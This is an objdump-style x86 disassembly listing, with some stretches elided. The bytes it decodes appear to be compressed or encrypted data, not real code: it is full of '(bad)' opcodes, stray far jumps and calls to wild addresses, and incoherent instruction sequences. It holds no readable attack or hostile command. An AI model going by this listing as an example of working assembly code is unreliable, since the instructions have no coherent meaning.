  425e78:	sbb    DWORD PTR [ebx-0x279908ce],ebp
  425e7e:	xor    esp,DWORD PTR [ebx-0x73]
  425e81:	sub    eax,0x38377f89
  425e86:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  425e88:	cld    
  425e89:	das    
  425e8a:	cmp    ah,BYTE PTR [eax+0x65]
  425e8d:	mov    dh,BYTE PTR [esi+edx*1-0x2361f578]
  425e94:	lock mov eax,ebx
  425e97:	cmc    
  425e98:	mov    esi,0xf5521673
  425e9d:	gs (bad) 
  425e9f:	in     eax,dx
  425ea0:	test   DWORD PTR [eax+eiz*2-0x1f],ebp
  425ea4:	call   0xbccc311c
  425ea9:	ja     0x425eb9
  425eab:	cmp    DWORD PTR [edi],ecx
  425ead:	fiadd  DWORD PTR [edi-0x4049df58]
  425eb3:	dec    ebx
  425eb4:	cs scas al,BYTE PTR es:[edi]
  425eb6:	retf   0xe577
  425eb9:	dec    ebp
  425eba:	cmp    ah,BYTE PTR ds:0x9edbc6a4
  425ec0:	fild   WORD PTR [esi+0x0]
	...
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx-0xa]
  425f41:	mov    ecx,0x94706e46
  425f46:	add    DWORD PTR [eax],eax
  425f48:	test   BYTE PTR [eax],0x0
  425f4b:	add    al,bh
  425f4d:	or     DWORD PTR [eax+0x222750ea],ebp
  425f53:	pushf  
  425f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f55:	mov    cl,0xe4
  425f57:	fimul  WORD PTR [ecx+eiz*2]
  425f5a:	pop    ss
  425f5b:	push   edi
  425f5c:	enter  0x382,0xfd
  425f60:	jno    0x425f99
  425f62:	out    dx,eax
  425f63:	sbb    cl,BYTE PTR [ecx]
  425f65:	or     eax,0x2ccfb97c
  425f6a:	lods   al,BYTE PTR es:[esi]
  425f6c:	or     esi,DWORD PTR [edi+0x2686d6e5]
  425f72:	rcr    BYTE PTR [esi],1
  425f74:	(bad)  [esi+0x4]
  425f77:	arpl   WORD PTR [ebx+0x7fa34b5],bx
  425f7d:	mov    bl,0xbd
  425f7f:	inc    ecx
  425f80:	dec    esi
  425f81:	in     al,dx
  425f82:	ins    BYTE PTR es:[edi],dx
  425f83:	(bad)  
  425f84:	jbe    0x425f69
  425f86:	ins    BYTE PTR es:[edi],dx
  425f87:	add    DWORD PTR [ecx-0x61],0x6b
  425f8b:	out    dx,eax
  425f8c:	mov    gs,esp
  425f8e:	adc    DWORD PTR [ecx-0x348864f3],edi
  425f94:	jmp    0x425fd1
  425f96:	test   eax,0x47c0c43a
  425f9b:	pop    eax
  425f9c:	into   
  425f9d:	call   0xa8eb:0x9b56db44
  425fa4:	stos   BYTE PTR es:[edi],al
  425fa5:	mov    ebx,0xd1e4d8a5
  425faa:	or     BYTE PTR [esi-0x12],bh
  425fad:	mov    bh,0x2e
  425faf:	cmp    al,0x4f
  425fb1:	fwait
  425fb2:	rol    DWORD PTR [eax-0x2cb66814],0xa
  425fb9:	aam    0xed
  425fbb:	inc    DWORD PTR [edx-0x1ecb0454]
  425fc1:	aaa    
  425fc2:	jno    0x426011
  425fc4:	sbb    al,BYTE PTR [edx-0x7150ba8f]
  425fca:	loop   0x42602e
  425fcc:	cmp    edx,edx
  425fce:	push   0x0
  425fd0:	loop   0x425fa8
  425fd2:	cmc    
  425fd3:	inc    ebp
  425fd4:	shl    BYTE PTR [edx-0x41],1
  425fd7:	adc    BYTE PTR [edi+0x2c],bl
  425fda:	lahf   
  425fdb:	in     al,0xdb
  425fdd:	sub    eax,0x448e3cae
  425fe2:	ins    DWORD PTR es:[edi],dx
  425fe3:	scas   eax,DWORD PTR es:[edi]
  425fe4:	rcr    DWORD PTR [ebx+0x567e5f33],cl
  425fea:	rcr    BYTE PTR [ecx-0x49],0x27
  425fee:	clc    
  425fef:	pop    edi
  425ff0:	adc    DWORD PTR ss:[ebp-0x79198c1],edx
  425ff7:	push   edx
  425ff8:	loop   0x425f7d
  425ffa:	mov    bl,0xb9
  425ffc:	dec    esp
  425ffd:	stc    
  425ffe:	pop    es
  425fff:	xchg   dh,cl
  426001:	imul   ebp,DWORD PTR [ecx-0x17],0x2b
  426005:	push   ds
  426006:	push   esi
  426007:	dec    esp
  426008:	push   ss
  426009:	add    ebp,eax
  42600b:	rcpps  xmm0,XMMWORD PTR [edx-0x19f83728]
  426012:	and    esp,edi
  426014:	outs   dx,DWORD PTR ds:[esi]
  426015:	arpl   WORD PTR [eax],sp
  426017:	inc    ebx
  426018:	jp     0x425fcd
  42601a:	push   es
  42601b:	fdivr  DWORD PTR [edi-0x3e]
  42601e:	inc    eax
  42601f:	sub    DWORD PTR [ecx+0x30],ecx
  426022:	sbb    ah,BYTE PTR [ebx-0xabe854d]
  426028:	sbb    ch,BYTE PTR [edx+0x44]
  42602b:	mov    ds:0xc9fab337,eax
  426030:	jmp    0x425fb6
  426032:	mov    ds:0xca8d6df7,al
  426037:	xchg   esi,edi
  426039:	outs   dx,DWORD PTR ds:[esi]
  42603a:	popa   
  42603b:	sub    dl,BYTE PTR ds:0x5ed9db74
  426041:	rol    DWORD PTR [eax],cl
	...
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0xe2aa1b88
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    bl,bl
  4260cd:	lods   al,BYTE PTR ds:[esi]
  4260ce:	repnz scas al,BYTE PTR es:[edi]
  4260d0:	and    esp,DWORD PTR [ecx+0x3d]
  4260d3:	pushf  
  4260d4:	pop    esp
  4260d5:	aam    0xf2
  4260d7:	stc    
  4260d8:	inc    esp
  4260d9:	mov    ?,esp
  4260db:	(bad)  
  4260dc:	jmp    0x426092
  4260de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260df:	sbb    esp,0x44
  4260e2:	mov    edx,0xccd68aa
  4260e7:	mov    ebp,0x29e93522
  4260ec:	add    al,BYTE PTR [ecx]
  4260ee:	in     al,0x8b
  4260f0:	sub    DWORD PTR [edi+0x23],esi
  4260f3:	or     BYTE PTR [ecx+0x5f],dh
  4260f6:	in     al,0x99
  4260f8:	sar    DWORD PTR [edx+ebx*8-0x5eda6f84],cl
  4260ff:	or     eax,ebp
  426101:	psubsb mm7,mm0
  426104:	sbb    eax,0xc50423a9
  426109:	ret    
  42610a:	leave  
  42610b:	xchg   esp,eax
  42610c:	dec    ebp
  42610d:	pusha  
  42610e:	cli    
  42610f:	cwde   
  426110:	mov    eax,0x4ee4bc8c
  426115:	out    0x59,eax
  426117:	les    ebx,FWORD PTR [edx]
  426119:	ss push ebx
  42611b:	xchg   BYTE PTR [esi-0x4e],bl
  42611e:	aam    0xf0
  426120:	inc    eax
  426121:	pusha  
  426122:	cwde   
  426123:	test   DWORD PTR [ebp-0xc88be98],esp
  426129:	xchg   BYTE PTR [ecx+0x76e00d74],dh
  42612f:	adc    eax,0x73e79852
  426134:	xor    ebx,DWORD PTR [edx]
  426136:	or     dl,ah
  426138:	pop    ebx
  426139:	sti    
  42613a:	dec    eax
  42613b:	cli    
  42613c:	(bad)  [ebx+0x772b8d58]
  426142:	cli    
  426143:	xchg   ebx,eax
  426144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426145:	lods   al,BYTE PTR fs:[esi]
  426147:	adc    al,0x27
  426149:	xchg   ecx,eax
  42614a:	ret    0xdd0c
  42614d:	sbb    al,0x27
  42614f:	lods   eax,DWORD PTR ds:[esi]
  426150:	pop    ss
  426151:	pop    es
  426152:	outs   dx,BYTE PTR ds:[esi]
  426153:	adc    al,0xf1
  426155:	mov    ds:0x9f992c49,al
  42615a:	xchg   DWORD PTR [esi-0x7b713e52],ecx
  426160:	mov    BYTE PTR [ebp+0x5a],dh
  426163:	jnp    0x426160
  426165:	icebp  
  426166:	mov    eax,0x637b50e3
  42616b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42616c:	loopne 0x42613f
  42616e:	nop
  42616f:	dec    ecx
  426170:	test   edi,esi
  426172:	je     0x426132
  426174:	int    0x80
  426176:	das    
  426177:	icebp  
  426178:	mov    WORD PTR [esi],gs
  42617a:	mov    bl,0x24
  42617c:	mov    cl,0xfc
  42617e:	jge    0xbffb874a
  426184:	loopne 0x4261b6
  426186:	jo     0x42613d
  426188:	imul   ebp,DWORD PTR [edi+0x259302c5],0xffffff88
  42618f:	in     al,dx
  426190:	fucomp st(5)
  426192:	push   esi
  426193:	dec    edx
  426194:	dec    edi
  426195:	cs hlt 
  426197:	ret    
  426198:	pop    es
  426199:	mov    bl,0xd
  42619b:	(bad)  
  42619d:	mov    ch,0xf3
  42619f:	cwde   
  4261a0:	mov    bl,0x25
  4261a2:	jo     0x4261f1
  4261a4:	mov    ebp,0xcee3caf6
  4261a9:	pop    esi
  4261aa:	aas    
  4261ab:	leave  
  4261ac:	(bad)  
  4261ad:	retf   
  4261ae:	daa    
  4261af:	nop
  4261b0:	push   ecx
  4261b1:	pop    ebx
  4261b2:	add    al,0x40
  4261b4:	xchg   DWORD PTR [ecx-0x57],esp
  4261b7:	mov    ah,0xab
  4261b9:	xchg   bh,ch
  4261bb:	and    bl,BYTE PTR [ecx]
  4261bd:	fistp  QWORD PTR [ebp+ebp*4+0xa5ed]
	...
  426234:	lods   al,BYTE PTR ds:[esi]
  426235:	les    esi,FWORD PTR [ebx-0x32]
  426238:	jnp    0x426239
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x30
  426241:	jle    0x426269
  426243:	stos   DWORD PTR es:[edi],eax
  426244:	pop    esp
  426245:	xchg   esi,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    ch,dl
  42624d:	sub    esi,ebp
  42624f:	dec    edi
  426250:	dec    edi
  426251:	mov    cl,ah
  426253:	dec    esp
  426254:	dec    edx
  426255:	inc    esi
  426256:	les    edx,FWORD PTR [edi+0x3b52ba9c]
  42625c:	sbb    ebp,DWORD PTR [ebx]
  42625e:	fidivr WORD PTR [ebx+0xb]
  426261:	dec    esp
  426262:	dec    eax
  426263:	pusha  
  426264:	sub    ecx,DWORD PTR [ebp*8+0x332bcdb2]
  42626b:	mov    edi,0xb0b95976
  426270:	jmp    DWORD PTR [ebp-0x72]
  426273:	adc    DWORD PTR [ecx-0x199a60e3],0x33
  42627a:	fcomp  QWORD PTR [eax]
  42627c:	fisttp QWORD PTR [ebx+0x7a492011]
  426282:	lea    esp,[eax-0x3e31c68]
  426288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426289:	ss or  eax,0x24b0c4de
  42628f:	push   edi
  426290:	mov    ebp,esi
  426292:	and    al,0x61
  426294:	out    0xc,eax
  426296:	clc    
  426297:	mov    ecx,0x7c88e9e8
  42629c:	or     BYTE PTR [edx-0x2afe4ee3],bh
  4262a2:	jecxz  0x426284
  4262a4:	sbb    eax,0x35e57946
  4262a9:	in     al,dx
  4262aa:	mov    ah,0xbb
  4262ac:	lods   eax,DWORD PTR ds:[esi]
  4262ad:	cmc    
  4262ae:	enter  0x16d9,0x49
  4262b2:	inc    edx
  4262b3:	push   ss
  4262b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262b5:	popa   
  4262b6:	sbb    BYTE PTR [edx-0x40],cl
  4262b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262ba:	xor    esp,DWORD PTR ds:0x784cafd5
  4262c0:	adc    bl,BYTE PTR [ecx+0x67]
  4262c3:	or     eax,DWORD PTR [esi+0x646fe99c]
  4262c9:	xor    eax,0x50f7f3ad
  4262ce:	sbb    eax,0xfb7e5b37
  4262d3:	call   0xd42c0a4b
  4262d8:	mov    es,WORD PTR [ecx+esi*1]
  4262db:	mov    ebx,0x9e1377b3
  4262e0:	(bad)  
  4262e1:	(bad)  [edi+0x4e]
  4262e4:	mov    ds:0x73bef2d5,al
  4262e9:	lahf   
  4262ea:	jle    0x42630f
  4262ec:	in     eax,0x57
  4262ee:	dec    esp
  4262ef:	pop    es
  4262f0:	jle    0x426317
  4262f2:	sub    eax,0x4274257d
  4262f7:	push   ebp
  4262f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262fa:	lea    esp,[edx-0x3343a500]
  426300:	das    
  426301:	(bad)  
  426302:	mov    al,ds:0xed8d03a0
  426307:	lahf   
  426308:	add    al,0x7d
  42630a:	or     BYTE PTR [ebx+ecx*1+0x5e8ee34a],dl
  426311:	or     DWORD PTR [edi+ecx*1-0x4e],ecx
  426315:	loop   0x4262c6
  426317:	dec    edi
  426318:	mov    edi,0x6bfeff15
  42631d:	mov    ch,0x78
  42631f:	aad    0x60
  426321:	mov    al,ds:0xd28e9a97
  426326:	push   0xfffffff7
  426328:	inc    eax
  426329:	sti    
  42632a:	imul   ecx,DWORD PTR [ebx-0x14],0x30
  42632e:	pop    ebp
  42632f:	sbb    edx,DWORD PTR [ecx+0x23]
  426332:	jns    0x42636f
  426334:	fmulp  st(4),st
  426336:	add    BYTE PTR [eax-0x1b599239],bh
  42633c:	mov    dh,0x57
  42633e:	sub    edi,DWORD PTR [eiz*1+0xbf]
	...
  4263b1:	add    BYTE PTR [eax],al
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	or     eax,0x525dcfa8
  4263c5:	xchg   edi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	test   BYTE PTR [eax],0x0
  4263cb:	add    bl,ch
  4263cd:	repz push 0x5d2d2c8c
  4263d3:	int3   
  4263d4:	std    
  4263d5:	xor    eax,0x6d27e1a5
  4263da:	not    DWORD PTR [eax-0x40]
  4263dd:	es mov esp,0x4daac12b
  4263e3:	inc    edx
  4263e4:	inc    ebx
  4263e5:	test   eax,0x5f4203be
  4263ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263eb:	sub    DWORD PTR [ebp+esi*2-0x12607c20],edx
  4263f2:	or     BYTE PTR [ebp+0x5d36ecd6],ch
  4263f8:	icebp  
  4263f9:	dec    ecx
  4263fa:	imul   ebx,DWORD PTR [edx-0x17d896d7],0x2
  426401:	mov    cl,0x17
  426403:	or     BYTE PTR [edi+0x4e],dh
  426406:	or     bh,BYTE PTR [edx+0x45]
  426409:	push   ds
  42640a:	push   ebx
  42640b:	add    esp,esp
  42640d:	cmp    al,0xcb
  42640f:	push   edx
  426410:	jmp    0x4263b5
  426412:	push   ebp
  426413:	sbb    ecx,DWORD PTR [edi-0x4866591f]
  426419:	pop    es
  42641a:	loopne 0x4263ae
  42641c:	sub    al,0xa4
  42641e:	push   esi
  42641f:	cdq    
  426420:	xchg   esp,eax
  426421:	jge    0x4263d6
  426423:	int    0x9
  426425:	jbe    0x4263f2
  426427:	jmp    FWORD PTR [eax-0x13]
  42642a:	ret    0xb95f
  42642d:	jp     0x426487
  42642f:	mov    al,0xa8
  426431:	retf   
  426432:	ss xchg esp,eax
  426434:	int    0x86
  426436:	cmp    ah,BYTE PTR [edi]
  426438:	add    BYTE PTR [ebx],bh
  42643a:	adc    eax,0x284abde5
  42643f:	arpl   di,cx
  426441:	inc    edi
  426442:	mov    al,ds:0xc2d85aea
  426447:	das    
  426448:	or     eax,DWORD PTR [ebx+esi*1+0x172664bf]
  42644f:	jl     0x42640f
  426451:	push   edi
  426452:	jae    0x4264b0
  426454:	xor    al,0x91
  426456:	test   al,0x9e
  426458:	mov    ch,ah
  42645a:	pop    edx
  42645b:	cld    
  42645c:	pop    ecx
  42645d:	div    esi
  42645f:	push   edx
  426460:	sbb    DWORD PTR [ebx+esi*2-0xa],edi
  426464:	das    
  426465:	push   cs
  426466:	cli    
  426467:	mov    ebx,0xcf053eb9
  42646c:	mov    ebx,0xa54f1497
  426471:	and    DWORD PTR [edx-0x17],eax
  426474:	mov    ebp,0x863c76c
  426479:	add    dh,BYTE PTR [edi-0x79]
  42647c:	jecxz  0x426462
  42647e:	into   
  42647f:	fcomp  DWORD PTR [esi+ebx*4]
  426482:	mov    cl,0x26
  426484:	hlt    
  426485:	jg     0x4264bd
  426487:	xlat   BYTE PTR ds:[ebx]
  426488:	jne    0x426455
  42648a:	rcl    BYTE PTR [ebp+0x3c],1
  42648d:	cwde   
  42648e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  426490:	jno    0x426412
  426492:	xlat   BYTE PTR ds:[ebx]
  426493:	cmp    ebx,esi
  426495:	in     al,0xfe
  426497:	or     ebx,esi
  426499:	push   ds
  42649a:	mov    eax,0xcea83805
  42649f:	sub    al,0x91
  4264a1:	stos   DWORD PTR es:[edi],eax
  4264a2:	add    eax,0xc4810f34
  4264a7:	popa   
  4264a8:	inc    esp
  4264a9:	loop   0x426438
  4264ab:	xchg   edx,eax
  4264ac:	not    cl
  4264ae:	pop    edx
  4264af:	pusha  
  4264b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264b1:	outs   dx,DWORD PTR ds:[esi]
  4264b2:	jae    0x426450
  4264b4:	adc    dh,ah
  4264b6:	cmp    dl,BYTE PTR [ecx-0x6da551db]
  4264bc:	test   al,0xe5
  4264be:	xlat   BYTE PTR ds:[ebx]
  4264bf:	xchg   edi,eax
  4264c0:	fcom   DWORD PTR [ebp+0x0]
	...
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	aaa    
  426541:	add    al,0xc4
  426544:	dec    eax
  426545:	cwde   
  426546:	add    DWORD PTR [eax],eax
  426548:	test   BYTE PTR [eax],0x0
  42654b:	add    BYTE PTR [eax+0x48739f34],dl
  426551:	mov    cl,0x45
  426553:	sub    DWORD PTR [eax+0x4d],ecx
  426556:	lahf   
  426557:	out    dx,al
  426558:	cmp    eax,0x91eb31db
  42655d:	call   0x2b3e:0xe12f0293
  426564:	shr    BYTE PTR [eax],0x42
  426567:	jne    0x4265dc
  426569:	push   edx
  42656a:	rep lods al,BYTE PTR ds:[esi]
  42656c:	jbe    0x4264fd
  42656e:	push   ebx
  42656f:	xor    edi,DWORD PTR [edx+0x3f]
  426572:	mov    ebp,0x1c68deb4
  426577:	in     al,0x3f
  426579:	inc    ebx
  42657a:	push   ss
  42657b:	frstor [esp+eiz*8-0x68eaacb9]
  426582:	jo     0x42654c
  426584:	xrelease xchg DWORD PTR ds:0x38c3b1f6,ebx
  42658b:	add    DWORD PTR [ebx-0x2a8ff337],0x35
  426592:	xor    BYTE PTR [edi-0x7fb059f],ah
  426598:	mov    al,ds:0xabdef255
  42659d:	mov    ch,0x3f
  42659f:	jp     0x426544
  4265a1:	pop    esp
  4265a2:	fimul  WORD PTR [eax]
  4265a4:	push   es
  4265a5:	addr16 ret 
  4265a7:	push   edx
  4265a8:	adc    eax,0xf0607dc8
  4265ad:	dec    edi
  4265ae:	bound  eax,QWORD PTR [esi+0x44085a7a]
  4265b4:	jae    0x426594
  4265b6:	test   DWORD PTR [edi],ecx
  4265b8:	jne    0x4265d4
  4265ba:	sbb    al,0x38
  4265bc:	push   es
  4265bd:	xchg   ebp,eax
  4265be:	dec    edi
  4265bf:	leave  
  4265c0:	jp     0x426544
  4265c2:	retf   0x9cd1
  4265c5:	popa   
  4265c6:	popa   
  4265c7:	fnsave [esi-0x1db0e4a2]
  4265cd:	mov    bh,0x58
  4265cf:	retf   0xd08c
  4265d2:	mov    bl,0x26
  4265d4:	mov    bh,0xc4
  4265d6:	loopne 0x4265c4
  4265d8:	push   edi
  4265d9:	sub    ebx,0xffffffcb
  4265dc:	adc    BYTE PTR [esi+0x56e1c685],0xe8
  4265e3:	stc    
  4265e4:	inc    esp
  4265e5:	mov    ah,0x97
  4265e7:	out    0xf3,eax
  4265e9:	jbe    0x42664e
  4265eb:	mov    ds:0xfa107413,eax
  4265f0:	frstpm(287 only) 
  4265f2:	sbb    ecx,DWORD PTR [esi+esi*1-0x33]
  4265f6:	je     0x426637
  4265f8:	inc    edx
  4265f9:	mov    ebx,0xfc2e7492
  4265fe:	fimul  WORD PTR [edx]
  426600:	popf   
  426601:	int3   
  426602:	adc    al,0x8
  426604:	or     cl,0x92
  426607:	cmp    bl,BYTE PTR [edx-0x46]
  42660a:	sahf   
  42660b:	shl    BYTE PTR [esi+0xb06f310],1
  426611:	push   ebx
  426612:	cmp    BYTE PTR [ecx],ah
  426614:	inc    eax
  426615:	inc    esi
  426616:	add    DWORD PTR [esi+0x6d92f6ec],ebx
  42661c:	xchg   ebp,eax
  42661d:	mov    ebx,0xa53c637a
  426622:	mov    cl,0x77
  426624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426625:	call   0x310d:0x9d535f95
  42662c:	rol    BYTE PTR [ebp-0x3f11b2b2],0xe3
  426633:	ffreep st(4)
  426635:	push   edi
  426636:	add    al,0x2c
  426638:	aas    
  426639:	add    BYTE PTR [edx],bh
  42663b:	lods   eax,DWORD PTR ds:[esi]
  42663c:	xchg   ebp,eax
  42663d:	fistp  QWORD PTR [ebx+0x91e5a4]
	...
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	ins    DWORD PTR es:[edi],dx
  4266c1:	lea    ebp,[ebp+0x1993ebb]
  4266c7:	add    dh,dh
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    BYTE PTR [ecx+0x4a],dh
  4266ce:	mov    ch,0x59
  4266d0:	pop    ebp
  4266d1:	sahf   
  4266d2:	ret    0x6e6f
  4266d5:	int3   
  4266d6:	sar    ch,0x7a
  4266d9:	xchg   esi,eax
  4266da:	pop    es
  4266db:	mov    ecx,0x495e25a7
  4266e0:	push   ebx
  4266e1:	mov    bh,0x2d
  4266e3:	inc    ecx
  4266e4:	jmp    0x124d:0x22a4cd1
  4266eb:	mov    ebp,0x3f841e2e
  4266f0:	or     eax,0xb732a4db
  4266f5:	inc    edi
  4266f6:	xor    BYTE PTR [esi],0x6f
  4266f9:	push   esp
  4266fa:	addr16 xor cl,bh
  4266fd:	leave  
  4266fe:	mov    esi,0x30653dc
  426703:	pop    ds
  426704:	push   0x9c689367
  426709:	xor    BYTE PTR [edi],bh
  42670b:	jbe    0x426695
  42670d:	je     0x426767
  42670f:	jecxz  0x4266b5
  426711:	sahf   
  426712:	push   ecx
  426713:	(bad)  
  426714:	push   edx
  426715:	cmp    al,0x7f
  426717:	fbstp  TBYTE PTR [eax]
  426719:	push   es
  42671a:	lods   al,BYTE PTR ds:[esi]
  42671b:	ins    DWORD PTR es:[edi],dx
  42671c:	or     bh,BYTE PTR [ebx]
  42671e:	jmp    0xd2b5:0x4b32380f
  426725:	sbb    DWORD PTR [ebx-0x57],esp
  426728:	cmp    BYTE PTR [edx],al
  42672a:	stos   DWORD PTR es:[edi],eax
  42672b:	ret    
  42672c:	add    ecx,DWORD PTR [ecx+edx*4-0x93ef3c7]
  426733:	xor    esp,0x29
  426736:	fwait
  426737:	jmp    0x426714
  426739:	aad    0x9f
  42673b:	stc    
  42673c:	jge    0x4266d9
  42673e:	or     al,0xa3
  426740:	frstor [eax]
  426742:	call   0xa431:0x351a635e
  426749:	mov    ebx,0x1105ba6a
  42674e:	ja     0x4267b1
  426750:	je     0x426784
  426752:	pop    ebx
  426753:	lahf   
  426754:	fcom   QWORD PTR [esi-0x5c0024c]
  42675a:	loop   0x4267ad
  42675c:	xlat   BYTE PTR ds:[ebx]
  42675d:	(bad)  
  42675e:	fidiv  WORD PTR [ecx+0x5c500108]
  426764:	popf   
  426765:	cmp    al,0xe1
  426767:	sbb    BYTE PTR [esi-0x1097dc13],ah
  42676d:	stos   DWORD PTR es:[edi],eax
  42676e:	pusha  
  42676f:	inc    esi
  426770:	int3   
  426771:	xchg   ecx,eax
  426772:	dec    eax
  426773:	xor    ah,BYTE PTR [ebx]
  426775:	aam    0x18
  426777:	push   ss
  426778:	lea    edx,[edi+0x35]
  42677b:	xchg   edi,eax
  42677c:	test   DWORD PTR [esi+0x2c],edx
  42677f:	or     BYTE PTR [eax+0xeae47a4],dh
  426785:	jmp    0x42675c
  426787:	mov    dl,0x3e
  426789:	cmp    bh,BYTE PTR ds:0x9549c65a
  42678f:	mov    al,0x53
  426791:	mov    esi,DWORD PTR [edi+ecx*2-0x6f12ca4c]
  426798:	inc    esp
  426799:	daa    
  42679a:	sub    BYTE PTR [ecx-0x44],dl
  42679d:	daa    
  42679e:	add    ebx,DWORD PTR [esi+0x739deb19]
  4267a4:	mov    esp,0xd1053da5
  4267a9:	jecxz  0x4267db
  4267ab:	scas   eax,DWORD PTR es:[edi]
  4267ac:	fsubrp st(1),st
  4267ae:	mov    dl,0xab
  4267b0:	dec    edi
  4267b1:	(bad)  
  4267b2:	or     eax,0xdb08fdf0
  4267b7:	fcom   DWORD PTR [ebx+0x21]
  4267ba:	dec    esi
  4267bb:	out    dx,al
  4267bc:	mov    ch,0x60
  4267be:	lock leave 
  4267c0:	test   eax,0x50
	...
  426831:	add    BYTE PTR [eax],al
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x4d5c5234],cl
  426843:	adc    DWORD PTR [edx+ebx*4],esi
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    BYTE PTR [ebx-0x77],cl
  42684e:	mov    cl,0xbd
  426850:	push   es
  426851:	fdivr  st,st(4)
  426853:	das    
  426854:	aaa    
  426855:	adc    eax,0x8141766c
  42685a:	frstor [edx]
  42685c:	cmc    
  42685d:	retf   
  42685e:	pop    es
  42685f:	push   edi
  426860:	cld    
  426861:	xor    ebx,DWORD PTR [edx]
  426863:	ins    BYTE PTR es:[edi],dx
  426864:	fiadd  WORD PTR [esi]
  426866:	cmp    eax,0x79b0d7f9
  42686b:	xor    DWORD PTR [esi-0x80],0x77366075
  426872:	push   ecx
  426873:	mov    dh,0x43
  426875:	test   al,0x4b
  426877:	jecxz  0x426827
  426879:	aas    
  42687a:	xchg   edx,eax
  42687b:	mov    ecx,0xa342982f
  426880:	outs   dx,BYTE PTR ds:[esi]
  426881:	in     al,0x2b
  426883:	push   es
  426884:	xchg   BYTE PTR [esi+0x7d],cl
  426887:	(bad)  
  426888:	pop    ds
  426889:	fist   DWORD PTR [eax]
  42688b:	and    edx,DWORD PTR [esi+ecx*8-0x204f54cd]
  426892:	jns    0x426839
  426894:	test   eax,0x85c243da
  426899:	xchg   edx,eax
  42689a:	add    eax,0xdf8869b0
  42689f:	cmp    al,0xb7
  4268a1:	std    
  4268a2:	pusha  
  4268a3:	or     al,0x2e
  4268a5:	lea    esp,[ebx-0x487d4a9b]
  4268ab:	cmp    esi,ebp
  4268ad:	mov    dh,0x37
  4268af:	imul   esp,DWORD PTR [eax-0x4ec01df4],0xdca60e33
  4268b9:	aas    
  4268ba:	jg     0x4268ac
  4268bc:	pop    esi
  4268bd:	mov    ah,0xcf
  4268bf:	stc    
  4268c0:	adc    al,0xf8
  4268c3:	fsub   QWORD PTR [ebp+0x6d0bef6c]
  4268c9:	pop    edi
  4268ca:	pop    edi
  4268cb:	mov    DWORD PTR [ecx-0x77],ebp
  4268ce:	cmp    edi,DWORD PTR [ebx+ebx*8+0x10]
  4268d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268d3:	shl    BYTE PTR [eax-0x54],0xbf
  4268d7:	shr    DWORD PTR [esi-0x37],1
  4268da:	push   es
  4268db:	xor    dl,BYTE PTR [esi]
  4268dd:	jecxz  0x42691d
  4268df:	and    ah,cl
  4268e1:	ja     0x42694a
  4268e3:	pop    ss
  4268e4:	stc    
  4268e5:	add    DWORD PTR [ecx+0x70ddfecb],0xffffffa3
  4268ec:	add    eax,0x7a469688
  4268f1:	mov    bh,0x2
  4268f3:	call   0x63b6:0x1ed156d6
  4268fa:	pop    ecx
  4268fb:	push   0x9849acb1
  426900:	cmp    DWORD PTR [esi+0x64c51dbc],eax
  426906:	and    al,0xce
  426908:	sar    DWORD PTR [ebx],cl
  42690a:	dec    ebx
  42690b:	pop    ds
  42690c:	and    edx,esp
  42690e:	mov    bh,0x16
  426910:	sub    edi,DWORD PTR [edx]
  426912:	dec    esp
  426913:	xchg   DWORD PTR [ebx+esi*8],eax
  426916:	fwait
  426917:	icebp  
  426918:	mov    eax,0xf4d19b81
  42691d:	in     al,dx
  42691e:	jmp    0x94c676e5
  426923:	push   edi
  426924:	cmp    al,0x2f
  426926:	mov    ebp,0x2a94e3a6
  42692b:	inc    esi
  42692c:	and    ebp,edx
  42692e:	sub    al,0x64
  426930:	jl     0x426932
  426932:	xor    dl,BYTE PTR ds:0x89e27f0b
  426938:	mov    al,0x3a
  42693a:	jno    0x426979
  42693c:	fild   WORD PTR [ebp+0x286fac48]
	...
  4269b2:	add    BYTE PTR [eax],al
  4269b4:	shl    DWORD PTR [ebx+0x4],0x67
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
